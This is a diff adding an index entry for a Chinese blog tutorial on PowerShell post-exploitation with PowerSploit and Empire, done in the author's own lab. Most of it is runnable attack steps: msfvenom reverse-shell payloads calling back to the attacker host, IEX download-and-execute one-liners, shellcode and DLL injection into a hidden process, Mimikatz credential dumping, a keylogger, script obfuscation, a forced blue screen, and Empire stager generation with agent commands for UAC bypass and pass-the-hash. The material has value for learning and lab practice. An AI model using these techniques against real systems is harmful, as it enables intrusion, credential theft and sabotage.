@@ -1,6 +1,1185 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>powershell后渗透阶段---工具篇</title>
+    <url>/2020/08/18/powershell%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5-%E5%B7%A5%E5%85%B7%E7%AF%87/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近闭关修炼了一段时间，主要学习渗透测试，恶意代码分析先暂停下，学习这些东西我都有兴趣，多学些多见识见识，增加一下自己对安全的理解。</p>
+<p>在学习渗透测试的时候，重新温习了metasploit，觉得这个漏洞利用框架真厉害，最近也买了很多书，等看完（感觉得花很长时间，flag先立起来）的时候，再更新一篇博客（估计得很长时间之后了）来写这些书的观后体验（已经看完两本了，还有五本），有些书确实有些老了（目前看的书一本是15年，一本是18年的），但是核心知识不会变。</p>
+<p>最近学习到了后渗透阶段攻击，是对windows平台使用powershell来进行的，这份技术在17-18年挺火的（最近也不差），也有很多工具在那时候被开发出来，例如powersploit，empire，powerup，nishang等工具，之所以流行，关键因素还是powershell的强大，和powershell在主流windows操作系统上默认安装以及当时powershell免杀，目前随着技术的发展，powershell已经可以被主流杀软检测，但是powershell的混淆技术也十分高超，目前来说利用powershell也是非常不错的。</p>
+<p>这篇博客主要用来记录学习本人在使用powershell技术过程中的三大工具powersploit，empire，nishang，这篇博客有可能比较长，因为我想做的详细点，尽量设置好章节，以便我之后进行查阅。（注意：阅读本文章需要一定的powershell基础）</p>
+<a id="more"></a>
+
+<h1 id="powersploit"><a href="#powersploit" class="headerlink" title="powersploit"></a>powersploit</h1><p>powersploit是一款基于powershell的后渗透框架软件，包含很多powershell脚本来实现渗透测试中的：信息收集，权限提升，权限维持，其github项目地址为<code>https://github.com/PowerShellMafia/PowerSploit</code>（无语中，今天进去看，发现README.md更新了一行<strong>This project is no longer supported</strong>，过时技术，算了，主要学个思路，看个源码）</p>
+<h2 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h2><blockquote>
+<p>kali Linux 2020.02              ip：192.168.2.132</p>
+<p>Windows10 x86                  ip：192.168.2.129</p>
+</blockquote>
+<p>注意：本人是使用VMware虚拟机做实验，两台虚拟机都在NAT网络模式下，确保都在同一网段下，互相能ping通，kali这里防火墙默认没有禁止ping，Windows10这里需要在防火墙下开放ping，同时提供以下支持：</p>
+<blockquote>
+<p>kali开启apache服务：sudo service apache2 start</p>
+<p>将powersploit目录放到/var/www/html/中，确保Windows10能通过HTTP访问到</p>
+</blockquote>
+<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>powersploit按照功能分为多个模块，可以通过github上项目的目录结构得知其各模块的功能：</p>
+<blockquote>
+<p>AntivirusBypass：用于发现杀毒软件的查杀特征</p>
+<p>CodeExecution：在目标主机上执行代码</p>
+<p>Exfiltration：目标主机上的信息搜集</p>
+<p>Mayhem：蓝屏等破坏性脚本</p>
+<p>Persistence：持久化控制的后门脚本</p>
+<p>Recon：以目标主机作为跳板进行内网信息侦察</p>
+<p>ScriptModification：在目标主机上创建或者修改脚本</p>
+</blockquote>
+<p>powersploit本身就是一个powershell脚本集合，结合github上源代码和网上文档可以很快的上手，powersploit脚本众多，我只会尝试使用部分脚本。</p>
+<h2 id="powersploit实验"><a href="#powersploit实验" class="headerlink" title="powersploit实验"></a>powersploit实验</h2><h3 id="Invoke-Shellcode"><a href="#Invoke-Shellcode" class="headerlink" title="Invoke-Shellcode"></a>Invoke-Shellcode</h3><p>Invoke-Shellcode是CodeExecution模块下的一个脚本，这个脚本可以将shellcode插入到指定的进程ID或者当前powershell进程中</p>
+<ol>
+<li><p>首先使用msfvenom生成powershell格式的shellcode木马：</p>
+<blockquote>
+<p>sudo msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.2.132 LPORT=4444 -f powershell -o /var/www/html/test</p>
+</blockquote>
+<p> <img src="https://s1.ax1x.com/2020/08/19/dlJJgI.png" alt="dlJJgI.png"></p>
+</li>
+<li><p>接着在msf里设置监听</p>
+<p> <img src="https://s1.ax1x.com/2020/08/19/dlYuzn.png" alt="dlYuzn.png"></p>
+</li>
+<li><p>然后在目标机器powershell中输入以下命令下载Invoke-Shellcode脚本，以及msfvenom生成powershell格式的shellcode木马</p>
+<p> <code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/CodeExecution/Invoke-Shellcode.ps1&quot;)</code></p>
+<p> <code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/test&quot;)</code></p>
+<p> <img src="https://s1.ax1x.com/2020/08/19/dlNKbV.png" alt="dlNKbV.png"></p>
+</li>
+<li><p>然后在powershell中输入以下命令生成一个新的记事本进程，并设置为隐藏，在输入Get-Process命令查看进程pid</p>
+<p> <code>Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden</code></p>
+<p> <img src="https://s1.ax1x.com/2020/08/19/dlaMhF.png" alt="dlaMhF.png"></p>
+<p> 这里进程id为2924</p>
+</li>
+<li><p>接着输入以下命令，使用Invoke-Shellcode脚本进行进程注入，也可以不需要ProcessID，那么此时shellcode会注入到当前powershell进程中</p>
+<p> <code>Invoke-Shellcode -ProcessID 2924 -Shellcode($buf) -Force</code></p>
+<p> <img src="https://s1.ax1x.com/2020/08/19/dldy24.png" alt="dldy24.png"></p>
+<p> 注意：这里的$buf变量就是msfvenom生成powershell格式的shellcode木马中的变量，用来保存shellcode</p>
+<p> <img src="https://s1.ax1x.com/2020/08/19/dldzi8.png" alt="dldzi8.png"></p>
+</li>
+<li><p>此时回到msf监听界面发现已经反弹成功了</p>
+<p> <img src="https://s1.ax1x.com/2020/08/19/dlwQy9.png" alt="dlwQy9.png"></p>
+</li>
+</ol>
+<h3 id="Invoke-DllInjection"><a href="#Invoke-DllInjection" class="headerlink" title="Invoke-DllInjection"></a>Invoke-DllInjection</h3><p>Invoke-DllInjection也是CodeExecution模块下的一个脚本，这个脚本的作用就是将指定的dll注入到指定进程中。</p>
+<ol>
+<li><p>首先使用msfvenom生成一个dll木马</p>
+<p> <code>sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.2.132 lport=4444 -f dll -o /var/www/html/hacker.dll</code></p>
+<p> <img src="https://s1.ax1x.com/2020/08/20/d3YKsI.png" alt="d3YKsI.png"></p>
+</li>
+<li><p>接着在msf里设置监听</p>
+<p> <img src="https://s1.ax1x.com/2020/08/19/dlcYxf.png" alt="dlcYxf.png"></p>
+<p> 注意这里的payload是windows/meterpreter/reverse_tcp</p>
+</li>
+<li><p>在目标机上下载dll，以及在powershell中加载Invoke-DllInjection脚本</p>
+<p> <code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/CodeExecution/Invoke-DllInjection.ps1&quot;)</code></p>
+<p> 这里我通过http下载到hacker.dll然后将其放到c盘根目录中</p>
+<p> 启动一个新的进程来进行dll注入</p>
+<p> <code>Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden</code></p>
+<p> 进程id为4688</p>
+</li>
+<li><p>然后使用以下命令进行dll注入，并且在msf中收到反弹shell</p>
+<p> <code>Invoke-DllInjection -ProcessID 4688 -Dll c:\hacker.dll</code></p>
+<p> <img src="https://s1.ax1x.com/2020/08/19/dlRYxx.png" alt="dlRYxx.png"></p>
+<p> <img src="https://s1.ax1x.com/2020/08/19/dlR7zq.png" alt="dlR7zq.png"></p>
+</li>
+</ol>
+<h3 id="Invoke-ReflectivePEInjection"><a href="#Invoke-ReflectivePEInjection" class="headerlink" title="Invoke-ReflectivePEInjection"></a>Invoke-ReflectivePEInjection</h3><p>Invoke-ReflectivePEInjection也是CodeExecution模块下的一个脚本，按照官方给的文档中说的，这个脚本有两个功能，一个是将Windows PE文件（DLL / EXE）反射性地加载到powershell进程中，另一个就是将DLL反射性地注入到远程进程中，引用官方文档中的话：</p>
+<blockquote>
+<p>（1）将DLL或EXE反射性地加载到Powershell进程的内存中。 因为DLL / EXE是反射性加载的，所以当使用工具列出正在运行的进程的DLL时，不会显示它。</p>
+<p>​        通过提供本地Windows PE文件（DLL / EXE）加载到远程系统的内存中，可以在远程服务器上运行此工具， 这会将DLL / EXE加载并执行到内存中，而无需将任何文件写入磁盘。</p>
+<p>（2）将DLL反射性地加载到远程进程的内存中。 如上所述，当使用工具列出正在运行的远程进程的DLL时，将不会显示正在反射加载的DLL。</p>
+<p>  ​        这对于在会话中向系统进程中注入后门可能是最有用的。 目前，无法从DLL检索输出。 脚本不会等待DLL完成执行，也不会对远程进程中的内存进行任何清理。</p>
+</blockquote>
+<p>注意：反射DLL注入用于将DLL加载到进程中，而不必将其放置在主机的文件系统上</p>
+<p>有些不太理解这个脚本的第二个功能，试着做下第一个功能，为了和Invoke-DllInjection区别开，这次使用msfvenom写一个exe文件，exe也是pe文件格式，把exe尝试反射加载到powershell进程中，用msf进行监听，最后取得meterpreter shell</p>
+<ol>
+<li><p>使用msfvenom写一个exe木马</p>
+<p> <code>sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.2.132 lport=4444 -f exe -o /var/www/html/hacker_exe.exe</code></p>
+<p> <img src="https://s1.ax1x.com/2020/08/19/d1YT5F.png" alt="d1YT5F.png"></p>
+</li>
+<li><p>在目标机上加载Invoke-ReflectivePEInjection脚本，并且在kali上设置msf监听</p>
+<p> <code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1&quot;)</code></p>
+<p> 这里我依旧将exe木马通过http协议下载到windows10上，并且将其放到c盘根目录上</p>
+<p> 然后使用如下命令运行脚本</p>
+<p> <code>$PEBytes=[IO.File]::ReadAllBytes(&#39;c:\hacker_exe.exe&#39;)</code></p>
+<p> <code>Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR</code></p>
+<p> <img src="https://s1.ax1x.com/2020/08/19/d1azyd.png" alt="d1azyd.png"></p>
+</li>
+<li><p>此时在kali就能看到返回过来的session</p>
+<p> <img src="https://s1.ax1x.com/2020/08/19/d1dJl4.png" alt="d1dJl4.png"></p>
+</li>
+</ol>
+<p>这个脚本感觉不太行，本来反射型dll注入的精髓在于能做到不再目标磁盘上留下文件，而这个脚本缺陷在于不能远程加载dll/exe，在网上查阅时候，发现有人写出了<a href="https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" target="_blank" rel="noopener">修改版</a>，可以从服务器下载文件并注入的脚本，具体的使用在文档中含有。</p>
+<h3 id="Invoke-Portscan"><a href="#Invoke-Portscan" class="headerlink" title="Invoke-Portscan"></a>Invoke-Portscan</h3><p>Invoke-Portscan是Recon模块下的一个脚本，主要用于端口扫描，使用起来也比较简单。</p>
+<p>载入脚本：</p>
+<p><code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/Recon/Invoke-Portscan.ps1&quot;)</code></p>
+<p>然后使用以下命令进行扫描：</p>
+<p><code>Invoke-Portscan -Hosts 192.168.2.1 -Ports &quot;21,22,23,80,445&quot;</code></p>
+<p><img src="https://s1.ax1x.com/2020/08/19/d1q55t.png" alt="d1q55t.png"></p>
+<p>这里192.168.2.1是我的物理机，可以看到检测出来开放了445端口。这个脚本可以使用参数<code>-HostFile</code>来载入一个ip字典，这个脚本胜在快捷方便。</p>
+<h3 id="Invoke-ReverseDnsLookup"><a href="#Invoke-ReverseDnsLookup" class="headerlink" title="Invoke-ReverseDnsLookup"></a>Invoke-ReverseDnsLookup</h3><p>Invoke-ReverseDnsLookup是Recon模块下的一个脚本，主要是在内网中反向DNS查询</p>
+<p>载入脚本：</p>
+<p><code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/Recon/Invoke-ReverseDnsLookup.ps1&quot;)</code></p>
+<p>然后使用以下命令进行查询：</p>
+<p><code>Invoke-ReverseDnsLookup &quot;192.168.2.132,192.168.2.129,192.168.2.1&quot; | fl IP,HostName</code></p>
+<p><img src="https://s1.ax1x.com/2020/08/19/d1jiM8.png" alt="d1jiM8.png"></p>
+<p>这里我没有设置域环境，这个脚本在域环境内更好用，通过DC服务器的DNS服务查询域内主机名和对应IP，更加快速的理清楚域内结构。</p>
+<h3 id="Invoke-Mimikatz"><a href="#Invoke-Mimikatz" class="headerlink" title="Invoke-Mimikatz"></a>Invoke-Mimikatz</h3><p>Mimikatz本身在内网渗透中作用很大，powersploit将其集成到Exfiltration模块下，Mimikatz用来抓取主机密码，注意的是这个脚本的运行需要管理员权限：</p>
+<p>载入脚本：</p>
+<p><code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/Exfiltration/Invoke-Mimikatz.ps1&quot;)</code></p>
+<p>然后使用以下命令进行抓取：</p>
+<p><code>Invoke-Mimikatz -DumpCreds</code></p>
+<p><img src="https://s1.ax1x.com/2020/08/19/d3ex8f.png" alt="d3ex8f.png"></p>
+<h3 id="Get-Keystrokes"><a href="#Get-Keystrokes" class="headerlink" title="Get-Keystrokes"></a>Get-Keystrokes</h3><p>Get-Keystrokes是Exfiltration模块下用来进行键盘记录的脚本，功能极其强大</p>
+<p>载入脚本：</p>
+<p><code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/Exfiltration/Get-Keystrokes.ps1&quot;)</code></p>
+<p>运行：</p>
+<p><code>Get-Keystrokes -LogPath C:\Users\BMooS\log.txt</code></p>
+<p><img src="https://s1.ax1x.com/2020/08/19/d3uI2V.png" alt="d3uI2V.png"></p>
+<p>打字输出的结果：</p>
+<p><img src="https://s1.ax1x.com/2020/08/19/d3KKsS.png" alt="d3KKsS.png"></p>
+<p>这里是使用的默认<code>-PollingInterval</code>和<code>-CollectionInterval</code>，所以记录时有重复，使用时可以自行调整。</p>
+<h3 id="Get-TimedScreenshot"><a href="#Get-TimedScreenshot" class="headerlink" title="Get-TimedScreenshot"></a>Get-TimedScreenshot</h3><p>Get-TimedScreenshot是Exfiltration模块下用来进行屏幕记录的脚本</p>
+<p>载入脚本：</p>
+<p><code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/Exfiltration/Get-TimedScreenshot.ps1&quot;)</code></p>
+<p>运行：</p>
+<p><code>Get-TimedScreenshot -Path C:\Users\BMooS\temp\ -Interval 5 -EndTime 1:02</code></p>
+<p>注意这里Interval参数是记录的时间间隔，单位是秒，Path路径是一个存在的文件夹，记录的图片会保存在文件夹下</p>
+<p><img src="https://s1.ax1x.com/2020/08/20/d3GTHK.png" alt="d3GTHK.png"></p>
+<h3 id="Out-CompressedDll"><a href="#Out-CompressedDll" class="headerlink" title="Out-CompressedDll"></a>Out-CompressedDll</h3><p>Out-CompressedDll是ScriptModification模块下用来对dll文件进行压缩混淆的脚本，调用方式：</p>
+<p><code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/ScriptModification/Out-CompressedDll.ps1&quot;)</code></p>
+<p>使用：</p>
+<p><code>Out-CompressedDll -FilePath C:\hacker.dll</code></p>
+<p>这个脚本的使用我搜了一晚上，搞不懂是最后如何使用，最后输出powershell代码，看到官方给的使用说是将其复制到ps1文件中，再加上<code>[Test]::DoStuff()</code>，注意的是这个只适用于MSIL-based dlls。（ 这个真搞不会。）</p>
+<h3 id="Out-EncodedCommand"><a href="#Out-EncodedCommand" class="headerlink" title="Out-EncodedCommand"></a>Out-EncodedCommand</h3><p>Out-EncodedCommand是ScriptModification模块下用来对powershell脚本或者代码块进行编码的脚本</p>
+<p>调用方式：</p>
+<p><code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/ScriptModification/Out-EncodedCommand.ps1&quot;)</code></p>
+<p>运行：</p>
+<ol>
+<li><p>对powershell代码块进行编码，示例：</p>
+<p> <code>Out-EncodedCommand -ScriptBlock {Write-Host &#39;hello, world!&#39;}</code></p>
+<p> <img src="https://s1.ax1x.com/2020/08/20/d3NXIf.png" alt="d3NXIf.png"></p>
+</li>
+<li><p>对powershell脚本文件进行编码，示例：</p>
+<p> <code>Out-EncodedCommand -Path C:\Users\BMooS\EvilPayload.ps1 -NonInteractive -NoProfile -WindowStyle Hidden -EncodedOutput</code></p>
+<p> 我在<code>C:\Users\BMooS\EvilPayload.ps1</code>文件下写入<code>&quot;test&quot; &gt; 1.txt</code></p>
+<p> <img src="https://s1.ax1x.com/2020/08/20/d3UViT.png" alt="d3UViT.png"></p>
+<p> 运行后powershell消失，在<code>C:\Users\BMooS\</code>下生成有<code>1.txt</code>文件</p>
+<p> <img src="https://s1.ax1x.com/2020/08/20/d3UMLR.png" alt="d3UMLR.png"></p>
+</li>
+</ol>
+<h3 id="Out-EncryptedScript"><a href="#Out-EncryptedScript" class="headerlink" title="Out-EncryptedScript"></a>Out-EncryptedScript</h3><p>Out-EncryptedScript是ScriptModification模块下用来对Script文件或者text file进行加密的脚本，可以设置password和salt</p>
+<p>调用方式：</p>
+<p><code>IEX(New-Object Net.WebClient).Downloadstring(&quot;http://192.168.2.132/powersploit/ScriptModification/Out-EncryptedScript.ps1&quot;)</code></p>
+<p>运行：</p>
+<p>加密：</p>
+<p><code>Out-EncryptedScript .\test.ps1 -Password 123456 -Salt bmoos -FilePath C:\Users\BMooS\encrypted.ps1</code></p>
+<p><img src="https://s1.ax1x.com/2020/08/20/d3UOX9.png" alt="d3UOX9.png"></p>
+<p><code>test.ps1</code>是我在<code>C:\Users\BMooS\</code>文件夹下写的一个powershell脚本，内容为<code>Write-Host &#39;hello, world!&#39;</code></p>
+<p>解密：</p>
+<p><img src="https://s1.ax1x.com/2020/08/20/d3aSk6.png" alt="d3aSk6.png"></p>
+<h3 id="Set-CriticalProcess"><a href="#Set-CriticalProcess" class="headerlink" title="Set-CriticalProcess"></a>Set-CriticalProcess</h3><p>Set-CriticalProcess是Mayhem模块下的两大函数之一，其作用就是在退出powershell后让系统蓝屏，注意在使用该模块时候，需要将Mayhem文件夹移动到<code>C:\Windows\System32\WindowsPowerShell\v1.0\Modules</code>目录下，然后使用<code>Import-Module Mayhem</code>导入模块</p>
+<p>运行：直接在powershell中输入<code>Set-CriticalProcess</code>（注意需要管理员权限）</p>
+<p><img src="https://s1.ax1x.com/2020/08/20/d3aBjJ.png" alt="d3aBjJ.png"></p>
+<p>然后在powershell中输入exit退出powershell程序，系统蓝屏：</p>
+<p><img src="https://s1.ax1x.com/2020/08/20/d3aW9O.png" alt="d3aW9O.png"></p>
+<h1 id="empire"><a href="#empire" class="headerlink" title="empire"></a>empire</h1><p>Empire 是一款类似 Metasploit 的 PowerShell 可视化后期渗透测试框架，建立在密码安全通信和灵活的架构上。Empire 实现了无需 powershell.exe 就可运行 PowerShell 代理的功能,可快速部署后期漏洞利用模块，从键盘记录器到 Mimikatz，并且能够适应通信躲避网络检测，所有的这些功能都封装在一个以实用性为重点的框架中。(抄的，目前理解程度没那么深)</p>
+<p>原本的<a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">empire项目</a>已经<strong>This project is no longer supported</strong>，毕竟这个还是和powersploit一样在17-18年很火，不过幸运的是，empire项目被BC-security接手，并发布了<a href="https://github.com/BC-SECURITY/Empire" target="_blank" rel="noopener">empire3.0</a>，更好的可以移植到kali2020.02版上(原项目在最新kali上不支持了)，以下是关于empire3.0的更新内容：</p>
+<blockquote>
+<p>从过去的纯 Python 2.7 移植到 2.7/3.x 环境。鉴于 Python 2.7 即将于 2019 年底走到尽头，Debian 已经开始放弃对所有 Python 2.7 程序包的支持。Debian 停止支持已经影响到了 Kali 对多个工具的支持，其中就包括 Empire。移植 Python3.x 后，能够确保 Empire 在未来很长一段时间都能获得 Kali 的支持。</p>
+<p>除了向 Python3 移植外，Empire3.0 还增加了大量新功能模块（其中有些模块已经出现在开发分支版本中）。</p>
+<p>通过更新 Base Launcher 消除了原有的一些签名和导致被 Windows Defender 发现的 bug。</p>
+<p>Mimikatz 是当下最流行的后渗透测试工具之一，能够从内存中提取哈希值、密码等信息。在 Empire3.0 中， Mimikatz 升级到 2.2.0 版本，使得攻击 Windows 10（尤其是1903）成为可能。另外一个重要的新功能是加入了数据保护 API (DPAPI) 支持 Powershell PSCredential 和 SecureString。最新版本的 Mimkatz 已经在 Github 上架（<a href="https://github.com/gentilkiwi/mimikatz）" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz）</a></p>
+<p>JA3 是 TLS 握手的指纹机制，是识别恶意加密流量的推荐方案。Akamai 发布的威胁研究报告显示，如今超过 80% 的恶意流量都流经加密通道。因此，很多防御者也开始采用这种技术。</p>
+</blockquote>
+<p>(这就是大神的世界吗？真的好仰慕，想成为大神这样的人)</p>
+<h2 id="环境设置-1"><a href="#环境设置-1" class="headerlink" title="环境设置"></a>环境设置</h2><blockquote>
+<p>kali Linux 2020.02              ip：192.168.2.132 </p>
+<p>Windows7 x64                  ip：192.168.2.130</p>
+</blockquote>
+<h2 id="empire实验"><a href="#empire实验" class="headerlink" title="empire实验"></a>empire实验</h2><p>在kali上安装empire</p>
+<p><code>sudo apt install powershell-empire</code></p>
+<p>（empire3.0在kali2020.02上预装了，不过名字是powershell-empire。。。。）</p>
+<p><img src="https://s1.ax1x.com/2020/08/21/dN79Y9.png" alt="dN79Y9.png"></p>
+<p>empire的使用和metasploit使用类似，都是先设置一个监听，接着生成一个木马，木马在目标主机上运行，监听也会连接上反弹回来的代理</p>
+<h3 id="设置监听"><a href="#设置监听" class="headerlink" title="设置监听"></a>设置监听</h3><p>输入<code>uselistener</code>来设置采用什么方式，使用双击Tab键可以看到一共有7种模式，分别为：dbx、http、http_com、http_foreign、http_hop、http_mapi、meterpreter、onedrive、redirector</p>
+<p><img src="https://s1.ax1x.com/2020/08/22/ddeyhF.png" alt="ddeyhF.png"></p>
+<p>选择<code>http</code>模式,输入命令<code>uselistener http</code>然后输入<code>info</code>命令查看具体参数设置</p>
+<p><img src="https://s1.ax1x.com/2020/08/22/ddeIAK.png" alt="ddeIAK.png"></p>
+<p>用<code>set</code>命令设置相应参数，修改<code>Name</code>，<code>Host</code>(默认是本机)和<code>Port</code>，然后输入命令<code>execute</code>命令开始监听</p>
+<p><img src="https://s1.ax1x.com/2020/08/22/ddmP3Q.png" alt="ddmP3Q.png"></p>
+<p>输入<code>back</code>命令即可返回上一层的<code>listeners</code>界面，输入<code>listeners</code>命令可以列出当前激活的<code>listener</code></p>
+<p><img src="https://s1.ax1x.com/2020/08/22/ddmcUf.png" alt="ddmcUf.png"></p>
+<p>注意，如果开启多个监听，必须使用不同的名称，且使用不同的端口，如果要删除某个监听使用<code>kill</code>命令加上监听的<code>Name</code></p>
+<h3 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h3><p>设置完监听后，接下来生成木马在目标机器上运行stager。输入<code>usestager</code>来采用什么模块，依旧是双击Tab键，</p>
+<p><img src="https://s1.ax1x.com/2020/08/22/ddnPIK.png" alt="ddnPIK.png"></p>
+<p><code>multi</code>为通用模块、<code>osx</code>是mac操作系统，下面介绍Windows下几个常用的模块（DLL也常用，但是需要其他来辅助DLL运行，可以使用powersploit中的Invoke-DllInjection模块）</p>
+<h4 id="launcher-vbs"><a href="#launcher-vbs" class="headerlink" title="launcher_vbs"></a>launcher_vbs</h4><p>生成vbs木马要使用到<code>windows/launcher_vbs</code>模块，输入<code>usestager windows/launcher_vbs</code>，在输入<code>info</code>查看模块信息</p>
+<p> <img src="https://s1.ax1x.com/2020/08/22/ddYWGR.png" alt="ddYWGR.png"></p>
+<p>这里只需要设置好<code>Listener</code>即可，然后execute运行，生成vbs文件</p>
+<p><img src="https://s1.ax1x.com/2020/08/22/ddt0FH.png" alt="ddt0FH.png"></p>
+<p>最后输入<code>back</code>返回到<code>listeners</code>界面开始监听，在目标机器上运行vbs文件即可</p>
+<p><img src="https://s1.ax1x.com/2020/08/22/ddN4HO.png" alt="ddN4HO.png"></p>
+<p>输入<code>agents</code>查看会话列表，使用<code>rename</code>命令更改名称</p>
+<p><img src="https://s1.ax1x.com/2020/08/22/ddUdGd.png" alt="ddUdGd.png"></p>
+<p>其他的木马模块操作类似，这种玩多了就有点脚本小子的感觉，像玩游戏一样，具体操作还是得看实际情况，可以多摸索摸索</p>
+<h4 id="launcher"><a href="#launcher" class="headerlink" title="launcher"></a>launcher</h4><p>如果想要简单的powershell代码或者python代码，在设置完监听模块后，在<code>listeners</code>界面输入：</p>
+<p><code>launcher powershell test1</code> 生成powershell代码</p>
+<p><img src="https://s1.ax1x.com/2020/08/22/ddJhDS.png" alt="ddJhDS.png"></p>
+<p><code>launcher python test1</code> 生成python代码</p>
+<p><img src="https://s1.ax1x.com/2020/08/22/ddJT4s.png" alt="ddJT4s.png"></p>
+<p>生成的代码放到目标机命令行中运行即可</p>
+<h3 id="连接使用"><a href="#连接使用" class="headerlink" title="连接使用"></a>连接使用</h3><p>当目标主机反弹shell成功后，可以使用<code>agents</code>命令列出当前所有的已连接主机，这里在username前带*意思是有管理员权限或者更高权限的主机（这里是因为我的win7虚拟机是使用管理员账户登陆的，所以直接就是管理员权限）</p>
+<p><img src="https://s1.ax1x.com/2020/08/22/ddUdGd.png" alt="ddUdGd.png"></p>
+<p>使用<code>interact &lt;name&gt;</code>进入主机，然后输入help命令即可以列出所有命令</p>
+<p><img src="https://s1.ax1x.com/2020/08/22/dd2s9P.png" alt="dd2s9P.png"></p>
+<p>这里根据help的提示也知道这些命令的使用，尝试使用<code>mimikatz</code>抓取密码（需要管理员权限）</p>
+<p><img src="https://s1.ax1x.com/2020/08/22/ddhcPs.png" alt="ddhcPs.png"></p>
+<p>可以使用<code>creds</code>来自动过滤整理出获得的用户密码</p>
+<p><img src="https://s1.ax1x.com/2020/08/22/ddhTIJ.png" alt="ddhTIJ.png"></p>
+<p>其他命令很简单也很实用，可以在实战中多多尝试</p>
+<blockquote>
+<p>agents            Jump to the agents menu.<br>back              Go back a menu.<br>bypassuac         Runs BypassUAC, spawning a new high-integrity agent for a listener. Ex. spawn <listener><br>clear             Clear out agent tasking.<br>creds             Display/return credentials from the database.<br>dirlist           Tasks an agent to store the contents of a directory in the database.<br>download          Task an agent to download a file into the C2.<br>exit              Task agent to exit.<br>help              Displays the help menu or syntax for particular commands.<br>info              Display information about this agent<br>injectshellcode   Inject listener shellcode into a remote process. Ex. injectshellcode <meter_listener> <pid><br>jobs              Return jobs or kill a running job.<br>kill              Task an agent to kill a particular process name or ID.<br>killdate          Get or set an agent’s killdate (01/01/2016).<br>list              Lists all active agents (or listeners).<br>listeners         Jump to the listeners menu.<br>lostlimit         Task an agent to change the limit on lost agent detection<br>main              Go back to the main menu.<br>mimikatz          Runs Invoke-Mimikatz on the client.<br>psinject          Inject a launcher into a remote process. Ex. psinject <listener> &lt;pid/process_name&gt;<br>pth               Executes PTH for a CredID through Mimikatz.<br>rename            Rename the agent.<br>resource          Read and execute a list of Empire commands from a file.<br>revtoself         Uses credentials/tokens to revert token privileges.<br>sc                Takes a screenshot, default is PNG. Giving a ratio means using JPEG. Ex. sc [1-100]<br>scriptcmd         Execute a function in the currently imported PowerShell script.<br>scriptimport      Imports a PowerShell script and keeps it in memory in the agent.<br>searchmodule      Search Empire module names/descriptions.<br>shell             Task an agent to use a shell command.<br>shinject          Inject non-meterpreter listener shellcode into a remote process. Ex. shinject <listener> <pid><br>sleep             Task an agent to ‘sleep interval [jitter]’<br>spawn             Spawns a new Empire agent for the given listener name. Ex. spawn <listener><br>steal_token       Uses credentials/tokens to impersonate a token for a given process ID.<br>sysinfo           Task an agent to get system information.<br>updatecomms       Dynamically update the agent comms to another listener<br>updateprofile     Update an agent connection profile.<br>upload            Task the C2 to upload a file into an agent.<br>usemodule         Use an Empire PowerShell module.<br>workinghours      Get or set an agent’s working hours (9:00-17:00)</p>
+</blockquote>
+<h3 id="模块使用"><a href="#模块使用" class="headerlink" title="模块使用"></a>模块使用</h3><p>empire最主要的功能在于模块上的使用，在不同模块中都集成了很多工具脚本，可以使用<code>searchmodule</code>命令来搜索模块</p>
+<h4 id="code-execution代码执行"><a href="#code-execution代码执行" class="headerlink" title="code_execution代码执行"></a>code_execution代码执行</h4><p><img src="https://s1.ax1x.com/2020/08/23/dwdyYF.png" alt="dwdyYF.png"></p>
+<table>
+<thead>
+<tr>
+<th>模块名</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>code_execution/invoke_dllinjection</td>
+<td>使用PowerSploit的Invoke-DLLInjection将Dll注入您选择的进程ID。</td>
+</tr>
+<tr>
+<td>code_execution/invoke_metasploitpayload</td>
+<td>生成一个新的隐藏PowerShell窗口，该窗口下载并执行Metasploit Payload。这与Metasploit模块theexploit/multi/scripts/web_delivery互动</td>
+</tr>
+<tr>
+<td>code_execution/invoke_ntsd</td>
+<td>使用NT Symbolic Debugger执行Empire launcher代码</td>
+</tr>
+<tr>
+<td>code_execution/invoke_reflectivepeinjection</td>
+<td>使用PowerSploit的Invoke-ReflectivePEInjection进行反射PE注入，将DLL/EXE加载进PowerShell进程中，或者将DLL加载进远程进程中</td>
+</tr>
+<tr>
+<td>code_execution/invoke_shellcode</td>
+<td>使用PowerSploit的Invoke–Shellcode注入Shellcode</td>
+</tr>
+<tr>
+<td>code_execution/invoke_shellcodemsil</td>
+<td>执行shellcode</td>
+</tr>
+</tbody></table>
+<h4 id="collection信息收集"><a href="#collection信息收集" class="headerlink" title="collection信息收集"></a>collection信息收集</h4><p><img src="https://s1.ax1x.com/2020/08/23/dwd2l9.png" alt="dwd2l9.png"></p>
+<table>
+<thead>
+<tr>
+<th>模块名</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
